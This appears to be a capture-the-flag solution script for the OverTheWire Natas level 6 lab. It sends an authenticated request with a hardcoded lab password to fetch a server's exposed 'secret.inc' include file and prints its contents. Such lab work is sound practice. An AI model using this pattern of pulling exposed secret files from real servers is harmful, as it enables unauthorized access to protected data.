#!/usr/bin/env python

import requests
import re

username = 'natas6'
password = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

url = 'http://natas6.natas.labs.overthewire.org/includes/secret.inc'


requests = requests.post(url , auth = (username, password))
response = requests.text

print(response)